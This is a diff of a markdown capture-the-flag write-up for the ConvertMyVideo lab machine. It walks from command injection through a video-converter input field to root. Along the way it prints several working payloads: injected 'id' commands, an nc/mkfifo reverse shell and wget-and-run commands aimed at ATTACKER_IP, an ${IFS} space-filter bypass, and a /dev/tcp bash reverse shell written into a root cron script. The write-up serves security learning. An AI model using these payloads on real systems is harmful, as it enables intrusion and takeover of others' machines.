@@ -8,9 +8,9 @@ tags:
   - pspy
 ---
 
-| Difficulty |
-| ---------- |
-|   Medium   |
+| Difficulty |  |  IP Address   |  |
+| :--------: |--| :-----------: |--|
+|   Medium   |  | 10.10.77.218  |  |
 
 ---
 
@@ -44,7 +44,7 @@ PORT   STATE SERVICE REASON         VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-Looks like there are only **2** ports open: **22** (SSH) and **80** (HTTP)
+Looks like there are only 2 ports open: **22 (SSH)** and **80 (HTTP)**
 
 Let's take a look at the HTTP webserver:
 
@@ -82,17 +82,17 @@ Looking at the source code of the web page, we can see that it loads in another 
 
 ![screenshot5](../assets/images/convertmyvideo/screenshot5.png)
 
-We can see that the page takes in the user input and appends it to "https://www.youtube.com/watch?v=". A fair assumption to make is that this url will then be passed to some internal program that is running on the server-side, which actually does the conversion to MP3. Of course, as the machine does not have access to the Internet, the conversion should never work as the machine will not be able to reach Youtube.
+We can see that the page takes in the user input and appends it to `https://www.youtube.com/watch?v=`. A fair assumption to make is that this url will then be passed to some internal program that is running on the server-side, which actually does the conversion to MP3. Of course, as the machine does not have access to the Internet, the conversion should never work as the machine will not be able to reach Youtube.
 
-At this stage, the first thought that came to my mind was: **Command Injection**.
+At this stage, the first thought that came to my mind was: **Command Injection**
 
 If the user input is being passed to a command-line program and is being executed on the shell-level, then perhaps we can inject some of our own OS commands to be run!
 
-To check whether the input is indeed being passed to a command-line program, let's try to input '**test**':
+To check whether the input is indeed being passed to a command-line program, let's try to input 'test':
 
 ![screenshot6](../assets/images/convertmyvideo/screenshot6.png)
 
-We get an interesting error message in the response. If we do a Google search of the error, we find that the error actually comes from an open-source program called [youtube-dl](https://github.com/ytdl-org/youtube-dl).
+We get an interesting error message in the response. If we do a Google search of the error, we find that the error actually comes from an open-source program called [youtube-dl](https://github.com/ytdl-org/youtube-dl):
 
 ![screenshot7](../assets/images/convertmyvideo/screenshot7.png)
 
@@ -102,7 +102,7 @@ Let's try injecting our own commands. We'll start off by trying to inject the `i
 
 *(More payloads can be found [here](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection))*
 
-Let's try a basic bypass using the `;` symbol: 
+Let's try a basic bypass using the `;` symbol *(Note: instead of `;`, we can also use* `|`*)*:
 
 ```
 test;id;
@@ -110,9 +110,9 @@ test;id;
 
 ![screenshot8](../assets/images/convertmyvideo/screenshot8.png)
 
-Nice it works! :smile: *(Note: instead of `;`, we can also use* `|`*)*
+Nice it works! :smile:
 
-Now we can try setting up a **reverse shell** so that we can gain an initial foothold into the machine. 
+Now we can try setting up a reverse shell so that we can gain an initial foothold into the machine. 
 
 *(Payload used is from [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md))*
 
@@ -127,7 +127,7 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f
 I then set up a simple HTTP server so that we can download the file onto the target machine. We can then inject the following commands into the web page:
 
 ```
-test;wget http://ATTACKER_IP:8000/shell.sh;chmod +x shell.sh;./shell.sh;`
+test;wget http://ATTACKER_IP:8000/shell.sh;chmod +x shell.sh;./shell.sh;
 ```
 
 This will have the target machine download our reverse shell script, make it executable, then execute it.
@@ -149,7 +149,7 @@ To bypass the space stripping, we can use `${IFS}` to replace the spaces.
 Now our payload becomes:
 
 ```
-test;wget${IFS}http://ATTACKER_IP:8000/shell.sh;chmod${IFS}+x${IFS}shell.sh;./shell.sh;`
+test;wget${IFS}http://ATTACKER_IP:8000/shell.sh;chmod${IFS}+x${IFS}shell.sh;./shell.sh;
 ```
 
 We send in the payload...
@@ -158,15 +158,15 @@ We send in the payload...
 
 And we're in! :smiling_imp:
 
-There is a directory called **admin** in **/var/www/html**:
+There is a directory called **admin** in /var/www/html:
 
 ![screenshot13](../assets/images/convertmyvideo/screenshot13.png)
 
-There is a hidden file called **.htpasswd** in this **admin** directory:
+There is a hidden file called **.htpasswd** in this directory:
 
 ![screenshot14](../assets/images/convertmyvideo/screenshot14.png)
 
-This file contains the **user** that can access the **/admin** subdirectory on the web server:
+This file contains the user that can access the **/admin** subdirectory on the web server:
 
 ![screenshot15](../assets/images/convertmyvideo/screenshot15.png)
 
@@ -188,29 +188,29 @@ The **user flag** can be found in the same directory:
 
 Now that we're in, let's find a way to escalate our privileges.
 
-Doing some digging around the filesystem, I found an interesting file called **clean.sh** in **/var/www/html/tmp**:
+Doing some digging around the filesystem, I found an interesting file called **clean.sh** in /var/www/html/tmp:
 
 ![screenshot17](../assets/images/convertmyvideo/screenshot17.png)
 
-This file is owned by **www-data** and is also writable. Let's look at the contents:
+This file is owned by www-data (us) and is also writable. Let's look at the contents:
 
 ![screenshot18](../assets/images/convertmyvideo/screenshot18.png)
 
 Just a simple `rm` command...
 
-From my past experiences with CTF challenges, these sort of 'clean-up' scripts are normally run periodically as a **cronjob**. Let's check **/etc/crontab** to see if clean.sh is being run as a cronjob:
+From my past experiences with CTF challenges, these sort of 'clean-up' scripts are normally run periodically as a cronjob. Let's check **/etc/crontab** to see if clean.sh is being run as a cronjob:
 
 ![screenshot19](../assets/images/convertmyvideo/screenshot19.png)
 
-Nothing here...
+Nothing here.
 
 With that said, it is possible to set up cronjobs without including them in the /etc/crontab file. Hence, let's use a nifty tool called [pspy](https://github.com/DominicBreuker/pspy/blob/master/README.md) to see if this is the case. `pspy` allows us to snoop on processes without the need for root permissions.
 
 ![screenshot20](../assets/images/convertmyvideo/screenshot20.png)
 
-Sure enough, after a minute has passed, we see that the **clean.sh** was indeed run! Furthermore, it was run by user with UID=0, aka **root**!
+Sure enough, after a minute has passed, we see that clean.sh was indeed run! Furthermore, it was run by user with UID=0, aka root!
 
-Since clean.sh is writeable by us, all we have to do is replace it with a **reverse shell script**:
+Since clean.sh is writeable by us, all we have to do is replace it with a reverse shell script:
 
 ```
 echo 'bash -i >& /dev/tcp/ATTACKER_IP/5555 0>&1' > clean.sh
@@ -222,6 +222,6 @@ Now set up a netcat listener, sit back and wait.
 
 We're now root!
 
-The root flag can be found in **/root**:
+The **root flag** can be found in /root:
 
 ![screenshot22](../assets/images/convertmyvideo/screenshot22.png)
